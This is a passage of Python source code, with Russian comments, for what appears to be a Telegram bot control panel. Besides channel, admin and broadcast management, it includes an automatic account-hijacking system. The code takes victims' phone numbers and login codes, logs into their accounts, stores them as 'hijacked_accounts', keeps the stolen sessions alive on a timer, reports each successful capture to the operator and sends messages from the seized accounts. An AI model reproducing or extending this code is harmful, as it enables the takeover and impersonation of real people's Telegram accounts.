        """Запускает мониторинг всех аккаунтов"""
        if self.is_running:
            return
        
        self.is_running = True
        logger.info("Запуск системы мониторинга аккаунтов")
        
        # Запускаем обработчик очереди
        asyncio.create_task(self._process_login_queue())
        
        # Запускаем периодические проверки
        asyncio.create_task(self._periodic_account_checks())
        
        # Восстанавливаем все сессии
        await self.restore_all_sessions()
    
    async def restore_all_sessions(self):
        """Восстанавливает все сохраненные сессии"""
        try:
            accounts = db.fetch_all("SELECT id FROM hijacked_accounts WHERE is_active = 1")
            
            logger.info(f"Восстановление {len(accounts)} сессий...")
            
            for account in accounts:
                account_id = account[0]
                try:
                    await account_manager.restore_session(account_id)
                    await asyncio.sleep(1)  # Задержка между восстановлениями
                except Exception as e:
                    logger.warning(f"Не удалось восстановить сессию {account_id}: {e}")
            
            logger.info("Восстановление сессий завершено")
            
        except Exception as e:
            logger.error(f"Ошибка восстановления сессий: {e}")
    
    async def _process_login_queue(self):
        """Обрабатывает очередь автоматического входа"""
        while self.is_running:
            try:
                task = await self.login_queue.get()
                
                if task['type'] == 'hijack':
                    await self._auto_hijack_account(
                        task['phone'],
                        task['code'],
                        task.get('method', 'telethon')
                    )
                elif task['type'] == 'restore':
                    await account_manager.restore_session(task['account_id'])
                
                self.login_queue.task_done()
                
            except Exception as e:
                logger.error(f"Ошибка обработки задачи входа: {e}")
                await asyncio.sleep(5)
    
    async def _auto_hijack_account(self, phone: str, code: str, method: str):
        """Автоматический захват аккаунта"""
        try:
            result = await account_manager.hijack_account(phone, code, method)
            
            if result['success']:
                # Уведомляем главного админа
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"✅ <b>АВТОМАТИЧЕСКИЙ ЗАХВАТ УСПЕШЕН</b>\n\n"
                    f"📱 Телефон: {phone}\n"
                    f"👤 Пользователь: @{result.get('username', 'нет')}\n"
                    f"🆔 ID аккаунта: {result['account_id']}\n"
                    f"🔧 Метод: {method}\n"
                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode="HTML"
                )
                
                # Запускаем мониторинг для этого аккаунта
                asyncio.create_task(self._monitor_account(result['account_id']))
            else:
                logger.error(f"Авто-захват не удался: {result['error']}")
                
        except Exception as e:
            logger.error(f"Ошибка авто-захвата: {e}")
    
    async def _monitor_account(self, account_id: int):
        """Мониторинг состояния аккаунта"""
        try:
            while self.is_running and account_id in account_manager.active_sessions:
                try:
                    # Проверяем доступность аккаунта
                    info = await account_manager.get_account_info(account_id)
                    
                    if 'error' in info:
                        # Пробуем восстановить
                        await account_manager.restore_session(account_id)
                    
                    # Обновляем статус в базе
                    db.execute(
                        "UPDATE hijacked_accounts SET last_check = ?, is_online = ? WHERE id = ?",
                        (datetime.now().isoformat(), 1, account_id)
                    )
                    
                    await asyncio.sleep(300)  # Проверка каждые 5 минут
                    
                except Exception as e:
                    logger.warning(f"Ошибка мониторинга аккаунта {account_id}: {e}")
                    await asyncio.sleep(60)
                    
        except Exception as e:
            logger.error(f"Мониторинг аккаунта {account_id} остановлен: {e}")
    
    async def _periodic_account_checks(self):
        """Периодические проверки всех аккаунтов"""
        while self.is_running:
            try:
                # Получаем список аккаунтов для проверки
                accounts = db.fetch_all('''
                    SELECT id FROM hijacked_accounts 
                    WHERE is_active = 1 
                    AND (last_check IS NULL OR last_check < ?)
                ''', ((datetime.now() - timedelta(hours=1)).isoformat(),))
                
                for account in accounts:
                    account_id = account[0]
                    try:
                        await account_manager.restore_session(account_id)
                        await asyncio.sleep(2)
                    except Exception as e:
                        logger.warning(f"Периодическая проверка не удалась для {account_id}: {e}")
                
                await asyncio.sleep(1800)  # Проверка каждые 30 минут
                
            except Exception as e:
                logger.error(f"Ошибка периодической проверки: {e}")
                await asyncio.sleep(300)
    
    async def stop_monitoring(self):
        """Останавливает мониторинг"""
        self.is_running = False
        logger.info("Мониторинг аккаунтов остановлен")

auto_login_system = AutoLoginSystem()

# ========== МЕНЕДЖЕР КАНАЛОВ И ГРУПП ==========
class ChannelManager:
    """Управление каналами и группами"""
    
    async def add_channel(self, channel_id: str, added_by: int, channel_info: Dict = None) -> Dict:
        """Добавляет канал/группу в систему"""
        try:
            # Проверяем, существует ли уже канал
            existing = db.fetch_one(
                "SELECT id FROM channels WHERE channel_id = ?",
                (channel_id,)
            )
            
            if existing:
                return {
                    'success': False,
                    'error': 'Канал уже добавлен',
                    'channel_id': existing[0]
                }
            
            # Получаем информацию о канале
            if not channel_info:
                try:
                    chat = await bot.get_chat(channel_id)
                    channel_info = {
                        'title': chat.title,
                        'username': chat.username,
                        'type': str(chat.type)
                    }
                except Exception as e:
                    logger.warning(f"Не удалось получить информацию о канале: {e}")
                    channel_info = {
                        'title': f'Канал {channel_id}',
                        'username': None,
                        'type': 'unknown'
                    }
            
            # Проверяем, является ли бот администратором
            bot_is_admin = False
            bot_permissions = {}
            
            try:
                member = await bot.get_chat_member(channel_id, (await bot.get_me()).id)
                if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
                    bot_is_admin = True
                    
                    if member.status == ChatMemberStatus.ADMINISTRATOR:
                        bot_permissions = {
                            'can_post_messages': member.can_post_messages or False,
                            'can_edit_messages': member.can_edit_messages or False,
                            'can_delete_messages': member.can_delete_messages or False,
                            'can_restrict_members': member.can_restrict_members or False,
                            'can_promote_members': member.can_promote_members or False,
                            'can_change_info': member.can_change_info or False,
                            'can_invite_users': member.can_invite_users or False,
                            'can_pin_messages': member.can_pin_messages or False,
                            'can_manage_chat': member.can_manage_chat or False,
                            'can_manage_video_chats': member.can_manage_video_chats or False
                        }
            except Exception as e:
                logger.warning(f"Не удалось проверить права бота в канале: {e}")
            
            # Добавляем канал в базу
            db.execute('''
                INSERT INTO channels 
                (channel_id, channel_title, channel_username, channel_type, added_by,
                 is_approved, notifications_enabled, admin_notifications, bot_is_admin, bot_permissions)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                channel_id,
                channel_info['title'],
                channel_info['username'],
                channel_info['type'],
                added_by,
                0,  # Не одобрен по умолчанию
                1,  # Уведомления включены
                1,  # Уведомления админу включены
                bot_is_admin,
                json.dumps(bot_permissions)
            ))
            
            channel_db_id = db.cursor.lastrowid
            
            # Отправляем уведомление главному админу
            if added_by != config.MAIN_ADMIN_ID:
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="✅ Одобрить",
                            callback_data=f"approve_channel:{channel_db_id}"
                        ),
                        InlineKeyboardButton(
                            text="❌ Отклонить", 
                            callback_data=f"reject_channel:{channel_db_id}"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="👁️ Просмотр", 
                            callback_data=f"view_channel:{channel_db_id}"
                        )
                    ]
                ])
                
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"🆕 <b>НОВЫЙ КАНАЛ ДОБАВЛЕН</b>\n\n"
                    f"📢 Название: {channel_info['title']}\n"
                    f"🔗 ID: {channel_id}\n"
                    f"👤 Добавил: {added_by}\n"
                    f"🤖 Бот админ: {'✅ Да' if bot_is_admin else '❌ Нет'}\n\n"
                    f"<i>Требуется одобрение для отправки уведомлений</i>",
                    parse_mode="HTML",
                    reply_markup=keyboard
                )
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'requires_approval': added_by != config.MAIN_ADMIN_ID,
                'bot_is_admin': bot_is_admin
            }
            
        except Exception as e:
            logger.error(f"Ошибка добавления канала: {e}")
            return {'success': False, 'error': str(e)}
    
    async def approve_channel(self, channel_db_id: int, approved_by: int) -> Dict:
        """Одобряет канал для отправки уведомлений"""
        try:
            # Получаем информацию о канале
            channel_data = db.fetch_one(
                "SELECT channel_id, channel_title, added_by FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_id, channel_title, added_by = channel_data
            
            # Обновляем статус
            db.execute('''
                UPDATE channels 
                SET is_approved = 1, approved_by = ?, approved_date = ?, admin_notifications = 0 
                WHERE id = ?
            ''', (approved_by, datetime.now().isoformat(), channel_db_id))
            
            # Уведомляем того, кто добавил канал
            if added_by != approved_by:
                try:
                    await bot.send_message(
                        added_by,
                        f"✅ <b>ВАШ КАНАЛ ОДОБРЕН!</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n"
                        f"👑 Одобрил: Главный админ\n\n"
                        f"Теперь бот будет отправлять уведомления в этот канал.",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (approved_by, 'channel_approved', f'Канал {channel_id} одобрен'))
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'channel_title': channel_title,
                'admin_notifications': False
            }
            
        except Exception as e:
            logger.error(f"Ошибка одобрения канала: {e}")
            return {'success': False, 'error': str(e)}
    
    async def reject_channel(self, channel_db_id: int, rejected_by: int, reason: str = "") -> Dict:
        """Отклоняет канал"""
        try:
            channel_data = db.fetch_one(
                "SELECT channel_id, channel_title, added_by FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_id, channel_title, added_by = channel_data
            
            # Удаляем канал из базы
            db.execute("DELETE FROM channels WHERE id = ?", (channel_db_id,))
            
            # Уведомляем того, кто добавил канал
            if added_by != rejected_by:
                try:
                    await bot.send_message(
                        added_by,
                        f"❌ <b>ВАШ КАНАЛ ОТКЛОНЕН!</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n"
                        f"👑 Отклонил: Главный админ\n"
                        f"📝 Причина: {reason or 'Не указана'}\n\n"
                        f"Бот не будет отправлять уведомления в этот канал.",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (rejected_by, 'channel_rejected', f'Канал {channel_id} отклонен: {reason}'))
            
            return {'success': True, 'channel_id': channel_db_id}
            
        except Exception as e:
            logger.error(f"Ошибка отклонения канала: {e}")
            return {'success': False, 'error': str(e)}
    
    async def toggle_channel_notifications(self, channel_db_id: int, enabled: bool = None) -> Dict:
        """Включает/выключает уведомления в канале"""
        try:
            # Если enabled не указан, переключаем на противоположное
            if enabled is None:
                current = db.fetch_one(
                    "SELECT notifications_enabled FROM channels WHERE id = ?",
                    (channel_db_id,)
                )
                if current:
                    enabled = not bool(current[0])
            
            db.execute(
                "UPDATE channels SET notifications_enabled = ? WHERE id = ?",
                (1 if enabled else 0, channel_db_id)
            )
            
            channel_data = db.fetch_one(
                "SELECT channel_title FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'notifications_enabled': enabled,
                'channel_title': channel_data[0] if channel_data else 'Unknown'
            }
            
        except Exception as e:
            logger.error(f"Ошибка переключения уведомлений: {e}")
            return {'success': False, 'error': str(e)}
    
    async def toggle_admin_notifications(self, channel_db_id: int, enabled: bool = None) -> Dict:
        """Включает/выключает уведомления админу"""
        try:
            if enabled is None:
                current = db.fetch_one(
                    "SELECT admin_notifications FROM channels WHERE id = ?",
                    (channel_db_id,)
                )
                if current:
                    enabled = not bool(current[0])
            
            db.execute(
                "UPDATE channels SET admin_notifications = ? WHERE id = ?",
                (1 if enabled else 0, channel_db_id)
            )
            
            channel_data = db.fetch_one(
                "SELECT channel_title FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            status = "включены" if enabled else "выключены"
            
            return {
                'success': True,
                'channel_id': channel_db_id,
                'admin_notifications': enabled,
                'status_text': f"Уведомления админу {status}"
            }
            
        except Exception as e:
            logger.error(f"Ошибка переключения админ-уведомлений: {e}")
            return {'success': False, 'error': str(e)}
    
    async def send_to_channel(self, channel_db_id: int, message: str, 
                            media_path: str = None, message_type: str = 'text') -> Dict:
        """Отправляет сообщение в канал"""
        try:
            # Получаем информацию о канале
            channel_data = db.fetch_one(
                "SELECT channel_id, notifications_enabled, admin_notifications FROM channels WHERE id = ?",
                (channel_db_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_id, notifications_enabled, admin_notifications = channel_data
            
            # Если уведомления в канал выключены, отправляем админу
            if not notifications_enabled:
                if admin_notifications:
                    await bot.send_message(
                        config.MAIN_ADMIN_ID,
                        f"🔕 <b>Сообщение для канала (уведомления выключены)</b>\n\n"
                        f"{message}",
                        parse_mode="HTML"
                    )
                    return {'success': True, 'sent_to_admin': True, 'sent_to_channel': False}
                else:
                    return {'success': False, 'error': 'Уведомления отключены'}
            
            # Отправляем в канал
            try:
                if media_path and os.path.exists(media_path):
                    with open(media_path, 'rb') as f:
                        if media_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                            sent_message = await bot.send_photo(
                                channel_id,
                                InputFile(f),
                                caption=message
                            )
                        elif media_path.lower().endswith('.mp4'):
                            sent_message = await bot.send_video(
                                channel_id,
                                InputFile(f),
                                caption=message
                            )
                        else:
                            sent_message = await bot.send_document(
                                channel_id,
                                InputFile(f),
                                caption=message
                            )
                else:
                    sent_message = await bot.send_message(
                        channel_id,
                        message,
                        parse_mode="HTML"
                    )
                
                # Обновляем последнее сообщение
                db.execute(
                    "UPDATE channels SET last_message_id = ?, last_activity = ? WHERE id = ?",
                    (sent_message.message_id, datetime.now().isoformat(), channel_db_id)
                )
                
                return {
                    'success': True,
                    'message_id': sent_message.message_id,
                    'sent_to_channel': True,
                    'sent_to_admin': False
                }
                
            except Exception as e:
                logger.error(f"Ошибка отправки в канал {channel_id}: {e}")
                
                # Если не удалось отправить в канал, отправляем админу
                if admin_notifications:
                    await bot.send_message(
                        config.MAIN_ADMIN_ID,
                        f"⚠️ <b>Ошибка отправки в канал</b>\n\n"
                        f"Канал: {channel_id}\n"
                        f"Ошибка: {str(e)[:200]}\n\n"
                        f"Сообщение: {message[:500]}",
                        parse_mode="HTML"
                    )
                    return {'success': False, 'error': str(e), 'sent_to_admin': True}
                else:
                    return {'success': False, 'error': str(e)}
                
        except Exception as e:
            logger.error(f"Ошибка отправки в канал: {e}")
            return {'success': False, 'error': str(e)}
    
    async def get_all_channels(self, filters: Dict = None) -> List[Dict]:
        """Получает список всех каналов"""
        try:
            query = "SELECT id, channel_id, channel_title, channel_username, is_approved, notifications_enabled, admin_notifications, added_date FROM channels"
            params = []
            
            if filters:
                conditions = []
                if filters.get('approved_only'):
                    conditions.append("is_approved = 1")
                if filters.get('active_only'):
                    conditions.append("notifications_enabled = 1")
                if filters.get('search'):
                    conditions.append("(channel_title LIKE ? OR channel_username LIKE ?)")
                    search_term = f"%{filters['search']}%"
                    params.extend([search_term, search_term])
                
                if conditions:
                    query += " WHERE " + " AND ".join(conditions)
            
            query += " ORDER BY added_date DESC"
            
            channels = db.fetch_all(query, params)
            
            result = []
            for ch in channels:
                result.append({
                    'id': ch[0],
                    'channel_id': ch[1],
                    'title': ch[2],
                    'username': ch[3],
                    'is_approved': bool(ch[4]),
                    'notifications_enabled': bool(ch[5]),
                    'admin_notifications': bool(ch[6]),
                    'added_date': ch[7]
                })
            
            return result
            
        except Exception as e:
            logger.error(f"Ошибка получения списка каналов: {e}")
            return []

channel_manager = ChannelManager()

# ========== МЕНЕДЖЕР АДМИНИСТРАТОРОВ ==========
class AdminManager:
    """Управление администраторами системы"""
    
    def __init__(self):
        self.admin_cache = {}
        self.load_admins_cache()
    
    def load_admins_cache(self):
        """Загружает администраторов в кэш"""
        try:
            admins = db.fetch_all(
                "SELECT user_id, username, permissions, is_main_admin FROM admins WHERE is_active = 1"
            )
            
            for admin in admins:
                self.admin_cache[admin[0]] = {
                    'username': admin[1],
                    'permissions': admin[2],
                    'is_main_admin': bool(admin[3])
                }
            
            logger.info(f"Загружено {len(self.admin_cache)} администраторов в кэш")
            
        except Exception as e:
            logger.error(f"Ошибка загрузки кэша администраторов: {e}")
    
    def is_admin(self, user_id: int) -> bool:
        """Проверяет, является ли пользователь администратором"""
        return user_id in self.admin_cache
    
    def is_main_admin(self, user_id: int) -> bool:
        """Проверяет, является ли пользователь главным администратором"""
        if user_id in self.admin_cache:
            return self.admin_cache[user_id]['is_main_admin']
        return False
    
    def has_permission(self, user_id: int, permission: str) -> bool:
        """Проверяет, есть ли у администратора определенное разрешение"""
        if not self.is_admin(user_id):
            return False
        
        admin_data = self.admin_cache[user_id]
        
        # Главный админ имеет все права
        if admin_data['is_main_admin']:
            return True
        
        permissions = admin_data['permissions']
        
        # Если разрешения 'all' - все доступно
        if permissions == 'all':
            return True
        
        # Проверяем конкретное разрешение
        permission_list = permissions.split(',')
        return permission in permission_list
    
    async def add_admin(self, user_id: int, username: str, added_by: int, 
                       permissions: str = 'basic') -> Dict:
        """Добавляет нового администратора"""
        try:
            # Проверяем, не является ли уже админом
            if self.is_admin(user_id):
                return {
                    'success': False,
                    'error': 'Пользователь уже является администратором'
                }
            
            # Проверяем лимит админов
            admin_count = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_active = 1")[0]
            if admin_count >= config.MAX_ADMINS:
                return {
                    'success': False,
                    'error': f'Достигнут лимит администраторов ({config.MAX_ADMINS})'
                }
            
            # Генерируем токен сессии
            session_token = encryptor.generate_token()
            session_expires = (datetime.now() + timedelta(days=30)).isoformat()
            
            # Добавляем в базу
            db.execute('''
                INSERT INTO admins 
                (user_id, username, added_by, permissions, session_token, session_expires)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user_id, username, added_by, permissions, session_token, session_expires))
            
            # Добавляем в кэш
            self.admin_cache[user_id] = {
                'username': username,
                'permissions': permissions,
                'is_main_admin': False
            }
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (added_by, 'add_admin', f'Добавлен админ {username} (ID: {user_id})'))
            
            # Уведомляем нового админа
            try:
                await bot.send_message(
                    user_id,
                    f"🎉 <b>ВЫ НАЗНАЧЕНЫ АДМИНИСТРАТОРОМ!</b>\n\n"
                    f"Вам предоставлены права администратора в системе SWILL.\n\n"
                    f"👤 Ваш ID: {user_id}\n"
                    f"🔑 Права: {permissions}\n"
                    f"👑 Добавил: ID {added_by}\n\n"
                    f"Используйте /start для доступа к панели администратора.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить нового админа: {e}")
            
            logger.info(f"Добавлен новый админ: {username} (ID: {user_id})")
            
            return {
                'success': True,
                'user_id': user_id,
                'username': username,
                'permissions': permissions
            }
            
        except Exception as e:
            logger.error(f"Ошибка добавления администратора: {e}")
            return {'success': False, 'error': str(e)}
    
    async def remove_admin(self, admin_id: int, removed_by: int, reason: str = "") -> Dict:
        """Удаляет администратора"""
        try:
            # Нельзя удалить главного админа
            if admin_id == config.MAIN_ADMIN_ID:
                return {
                    'success': False,
                    'error': 'Нельзя удалить главного администратора'
                }
            
            # Проверяем, существует ли админ
            admin_data = db.fetch_one(
                "SELECT username FROM admins WHERE user_id = ?",
                (admin_id,)
            )
            
            if not admin_data:
                return {'success': False, 'error': 'Администратор не найден'}
            
            username = admin_data[0]
            
            # Удаляем (деактивируем) админа
            db.execute('''
                UPDATE admins 
                SET is_active = 0, session_token = NULL, session_expires = NULL 
                WHERE user_id = ?
            ''', (admin_id,))
            
            # Удаляем из кэша
            if admin_id in self.admin_cache:
                del self.admin_cache[admin_id]
            
            # Уведомляем удаленного админа
            try:
                await bot.send_message(
                    admin_id,
                    f"⚠️ <b>ВАШИ ПРАВА АДМИНИСТРАТОРА ОТОЗВАНЫ</b>\n\n"
                    f"Вы больше не имеете доступа к панели администратора.\n\n"
                    f"👤 Ваш ID: {admin_id}\n"
                    f"👑 Отозвал: ID {removed_by}\n"
                    f"📝 Причина: {reason or 'Не указана'}\n\n"
                    f"По всем вопросам обращайтесь к главному администратору.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить удаленного админа: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (removed_by, 'remove_admin', f'Удален админ {username} (ID: {admin_id}): {reason}'))
            
            logger.info(f"Удален админ: {username} (ID: {admin_id})")
            
            return {
                'success': True,
                'admin_id': admin_id,
                'username': username,
                'removed_by': removed_by
            }
            
        except Exception as e:
            logger.error(f"Ошибка удаления администратора: {e}")
            return {'success': False, 'error': str(e)}
    
    async def update_admin_permissions(self, admin_id: int, permissions: str, 
                                     updated_by: int) -> Dict:
        """Обновляет права администратора"""
        try:
            # Проверяем, существует ли админ
            admin_data = db.fetch_one(
                "SELECT username FROM admins WHERE user_id = ? AND is_active = 1",
                (admin_id,)
            )
            
            if not admin_data:
                return {'success': False, 'error': 'Администратор не найден'}
            
            username = admin_data[0]
            
            # Обновляем права
            db.execute(
                "UPDATE admins SET permissions = ? WHERE user_id = ?",
                (permissions, admin_id)
            )
            
            # Обновляем кэш
            if admin_id in self.admin_cache:
                self.admin_cache[admin_id]['permissions'] = permissions
            
            # Уведомляем админа об изменении прав
            try:
                await bot.send_message(
                    admin_id,
                    f"🔧 <b>ВАШИ ПРАВА ОБНОВЛЕНЫ</b>\n\n"
                    f"Ваши права администратора были изменены.\n\n"
                    f"👤 Ваш ID: {admin_id}\n"
                    f"🔑 Новые права: {permissions}\n"
                    f"👑 Изменил: ID {updated_by}\n\n"
                    f"Некоторые функции могут стать недоступны.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить админа об изменении прав: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (updated_by, 'update_admin_permissions', f'Обновлены права для {username}: {permissions}'))
            
            return {
                'success': True,
                'admin_id': admin_id,
                'username': username,
                'permissions': permissions
            }
            
        except Exception as e:
            logger.error(f"Ошибка обновления прав администратора: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_all_admins(self) -> List[Dict]:
        """Возвращает список всех администраторов"""
        try:
            admins = db.fetch_all('''
                SELECT a.user_id, a.username, a.added_by, a.added_date, a.permissions, 
                       a.is_main_admin, b.username as added_by_username
                FROM admins a
                LEFT JOIN admins b ON a.added_by = b.user_id
                WHERE a.is_active = 1
                ORDER BY a.is_main_admin DESC, a.added_date DESC
            ''')
            
            result = []
            for admin in admins:
                result.append({
                    'user_id': admin[0],
                    'username': admin[1],
                    'added_by': admin[2],
                    'added_by_username': admin[6],
                    'added_date': admin[3],
                    'permissions': admin[4],
                    'is_main_admin': bool(admin[5])
                })
            
            return result
            
        except Exception as e:
            logger.error(f"Ошибка получения списка администраторов: {e}")
            return []
    
    async def validate_session(self, user_id: int, session_token: str) -> bool:
        """Проверяет валидность сессии администратора"""
        try:
            admin_data = db.fetch_one(
                "SELECT session_token, session_expires FROM admins WHERE user_id = ? AND is_active = 1",
                (user_id,)
            )
            
            if not admin_data:
                return False
            
            stored_token, expires_str = admin_data
            
            if not stored_token or stored_token != session_token:
                return False
            
            # Проверяем срок действия
            expires = datetime.fromisoformat(expires_str)
            if expires < datetime.now():
                return False
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка проверки сессии: {e}")
            return False
    
    async def create_session(self, user_id: int) -> str:
        """Создает новую сессию для администратора"""
        try:
            session_token = encryptor.generate_token()
            session_expires = (datetime.now() + timedelta(days=30)).isoformat()
            
            db.execute(
                "UPDATE admins SET session_token = ?, session_expires = ? WHERE user_id = ?",
                (session_token, session_expires, user_id)
            )
            
            return session_token
            
        except Exception as e:
            logger.error(f"Ошибка создания сессии: {e}")
            return None

admin_manager = AdminManager()

# ========== СИСТЕМА ОТПРАВКИ СООБЩЕНИЙ ==========
class MessageSystem:
    """Система отправки сообщений пользователям"""
    
    async def send_to_user_by_username(self, username: str, message: str, 
                                     from_admin_id: int, media_path: str = None) -> Dict:
        """Отправляет сообщение пользователю по username"""
        try:
            # Пытаемся найти пользователя по username
            user_id = await self._resolve_username(username)
            
            if not user_id:
                return {
                    'success': False,
                    'error': f'Пользователь {username} не найден'
                }
            
            # Отправляем сообщение
            try:
                if media_path and os.path.exists(media_path):
                    with open(media_path, 'rb') as f:
                        if media_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                            sent_message = await bot.send_photo(
                                user_id,
                                InputFile(f),
                                caption=message
                            )
                        elif media_path.lower().endswith('.mp4'):
                            sent_message = await bot.send_video(
                                user_id,
                                InputFile(f),
                                caption=message
                            )
                        else:
                            sent_message = await bot.send_document(
                                user_id,
                                InputFile(f),
                                caption=message
                            )
                else:
                    sent_message = await bot.send_message(
                        user_id,
                        message,
                        parse_mode="HTML"
                    )
                
                # Сохраняем в базу
                db.execute('''
                    INSERT INTO messages 
                    (message_id, from_admin_id, to_user_id, to_username, message_text, 
                     message_type, sent_date, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    sent_message.message_id,
                    from_admin_id,
                    user_id,
                    username,
                    message,
                    'photo' if media_path and media_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 
                    'video' if media_path and media_path.lower().endswith('.mp4') else 
                    'document' if media_path else 'text',
                    datetime.now().isoformat(),
                    'delivered'
                ))
                
                # Логируем действие
                db.execute('''
                    INSERT INTO security_logs 
                    (admin_id, action, details)
                    VALUES (?, ?, ?)
                ''', (from_admin_id, 'send_message', f'Отправлено сообщение пользователю {username}'))
                
                return {
                    'success': True,
                    'message_id': sent_message.message_id,
                    'user_id': user_id,
                    'username': username,
                    'status': 'delivered'
                }
                
            except TelegramBadRequest as e:
                error_msg = str(e)
                if "user not found" in error_msg.lower() or "chat not found" in error_msg.lower():
                    status = 'user_not_found'
                elif "blocked" in error_msg.lower():
                    status = 'user_blocked'
                elif "privacy" in error_msg.lower():
                    status = 'privacy_restriction'
                else:
                    status = 'error'
                
                # Сохраняем в базу с ошибкой
                db.execute('''
                    INSERT INTO messages 
                    (from_admin_id, to_username, message_text, sent_date, status)
                    VALUES (?, ?, ?, ?, ?)
                ''', (from_admin_id, username, message, datetime.now().isoformat(), status))
                
                return {
                    'success': False,
                    'error': error_msg,
                    'status': status
                }
                
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения пользователю {username}: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _resolve_username(self, username: str) -> Optional[int]:
        """Разрешает username в user_id"""
        try:
            # Убираем @ если есть
            if username.startswith('@'):
                username = username[1:]
            
            # Пробуем через get_chat
            try:
                chat = await bot.get_chat(f"@{username}")
                return chat.id
            except:
                pass
            
            # Проверяем в базе пользователей
            user_data = db.fetch_one(
                "SELECT user_id FROM users WHERE username = ?",
                (username,)
            )
            
            if user_data:
                return user_data[0]
            
            return None
            
        except Exception as e:
            logger.error(f"Ошибка разрешения username {username}: {e}")
            return None
    
    async def broadcast_to_all_channels(self, message: str, from_admin_id: int, 
                                      media_path: str = None) -> Dict:
        """Рассылает сообщение во все одобренные каналы"""
        try:
            # Получаем все одобренные каналы с включенными уведомлениями
            channels = db.fetch_all('''
                SELECT id, channel_id FROM channels 
                WHERE is_approved = 1 AND notifications_enabled = 1
            ''')
            
            if not channels:
                return {
                    'success': False,
                    'error': 'Нет одобренных каналов для рассылки'
                }
            
            results = {
                'total': len(channels),
                'success': 0,
                'failed': 0,
                'errors': []
            }
            
            # Отправляем в каждый канал
            for channel in channels:
                channel_db_id, channel_id = channel
                
                try:
                    result = await channel_manager.send_to_channel(
                        channel_db_id,
                        message,
                        media_path
                    )
                    
                    if result['success']:
                        results['success'] += 1
                    else:
                        results['failed'] += 1
                        results['errors'].append(f"{channel_id}: {result.get('error', 'Unknown error')}")
                    
                    # Задержка между отправками
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    results['failed'] += 1
                    results['errors'].append(f"{channel_id}: {str(e)[:100]}")
                    logger.error(f"Ошибка отправки в канал {channel_id}: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (from_admin_id, 'broadcast', f'Рассылка в {results["total"]} каналов: {results["success"]} успешно'))
            
            return {
                'success': results['success'] > 0,
                'results': results
            }
            
        except Exception as e:
            logger.error(f"Ошибка рассылки: {e}")
            return {'success': False, 'error': str(e)}
    
    async def send_from_hijacked_account(self, account_id: int, target: str, 
                                       message: str, from_admin_id: int) -> Dict:
        """Отправляет сообщение от захваченного аккаунта"""
        try:
            result = await account_manager.send_message_from_account(
                account_id,
                target,
                message
            )
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (from_admin_id, 'send_from_hijacked', f'Отправка от аккаунта {account_id} к {target}'))
            
            return result
            
        except Exception as e:
            logger.error(f"Ошибка отправки от захваченного аккаунта: {e}")
            return {'success': False, 'error': str(e)}

message_system = MessageSystem()

# ========== СОСТОЯНИЯ FSM ==========
class AdminStates(StatesGroup):
    # Состояния для управления админами
    waiting_admin_username = State()
    waiting_admin_permissions = State()
    waiting_admin_confirm = State()
    waiting_admin_remove = State()
    waiting_admin_remove_reason = State()
    
    # Состояния для отправки сообщений
    waiting_message_username = State()
    waiting_message_text = State()
    waiting_message_media = State()
    waiting_message_confirm = State()
    
    # Состояния для управления каналами
    waiting_channel_id = State()
    waiting_channel_confirm = State()
    waiting_channel_action = State()
    
    # Состояния для захвата аккаунтов
    waiting_hijack_phone = State()
    waiting_hijack_code = State()
    waiting_hijack_method = State()
    waiting_hijack_target = State()
    
